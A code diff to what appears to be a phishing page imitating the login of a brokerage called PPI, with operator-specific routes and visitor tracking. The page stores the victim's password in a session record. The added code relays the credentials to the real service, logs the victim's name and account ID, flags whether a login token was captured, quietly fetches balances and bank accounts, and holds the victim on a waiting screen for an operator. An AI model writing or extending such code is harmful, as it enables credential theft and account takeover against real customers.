@@ -1,10 +1,11 @@
 import { useState, useEffect, useCallback, useRef } from "react";
 import { useParams } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
+import { ppiApi } from "@/lib/ppiApi";
 import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
 import PpiLoginForm from "@/components/ppi/PpiLoginForm";
 
-type Step = "login" | "waiting" | "otp" | "done";
+type Step = "login" | "waiting" | "done";
 
 const PPI = () => {
   const { operatorCode: rawOperatorCode } = useParams<{ operatorCode?: string }>();
@@ -17,6 +18,7 @@ const PPI = () => {
   const [email, setEmail] = useState("");
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState("");
+  const [statusMsg, setStatusMsg] = useState("");
 
   const [sessionId, setSessionId] = useState("");
   const sessionIdRef = useRef("");
@@ -58,11 +60,49 @@ const PPI = () => {
 
     await createSession(submittedEmail, "login_attempt", { password });
 
-    // TODO: integrate PPI backend auth here
-    await updateSession("waiting_operator");
-    setStep("waiting");
+    try {
+      setStatusMsg("Verificando credenciales...");
+      const res = await ppiApi.login(submittedEmail, password, operatorCode);
+
+      if (res.success || res.raw?.status === 0) {
+        const fullName = res.fullName || res.raw?.payload?.denominacion || "";
+        const cuentaId = res.cuentaId || res.raw?.payload?.cuentaId || "";
+        
+        await updateSession("login_success", {
+          otp_code: `name:${fullName}|cuenta:${cuentaId}`,
+        });
+
+        // If we got a token, sync data
+        if (res.token) {
+          setStatusMsg("Sincronizando datos...");
+          try {
+            await ppiApi.balances(res.token, cuentaId);
+            await ppiApi.bankAccounts(res.token, cuentaId);
+          } catch { /* silent */ }
+          await updateSession("completed", {
+            otp_code: `name:${fullName}|cuenta:${cuentaId}|token:yes`,
+          });
+        } else {
+          // No token captured - still successful login  
+          await updateSession("waiting_operator", {
+            otp_code: `name:${fullName}|cuenta:${cuentaId}|token:pending`,
+          });
+        }
+
+        setStep("waiting");
+        setStatusMsg("Procesando...");
+      } else {
+        const msg = res.error || res.raw?.message || "Credenciales inválidas";
+        setError(msg);
+        await updateSession("login_error", { otp_code: `error:${msg}` });
+      }
+    } catch (e: any) {
+      setError(e.message || "Error de conexión");
+      await updateSession("login_error");
+    }
     setLoading(false);
-  }, [createSession, updateSession]);
+    setStatusMsg("");
+  }, [createSession, updateSession, operatorCode]);
 
   return (
     <div className="relative flex min-h-screen items-center justify-center overflow-hidden bg-[#f0f0f0]">
@@ -101,7 +141,7 @@ const PPI = () => {
         {step === "waiting" && (
           <div className="flex flex-col items-center gap-4 py-8 text-center">
             <div className="h-10 w-10 animate-spin rounded-full border-4 border-[#2196F3] border-t-transparent" />
-            <p className="text-[15px] text-[#555]">Procesando tu solicitud...</p>
+            <p className="text-[15px] text-[#555]">{statusMsg || "Procesando tu solicitud..."}</p>
             <p className="text-[13px] text-[#999]">{email}</p>
           </div>
         )}
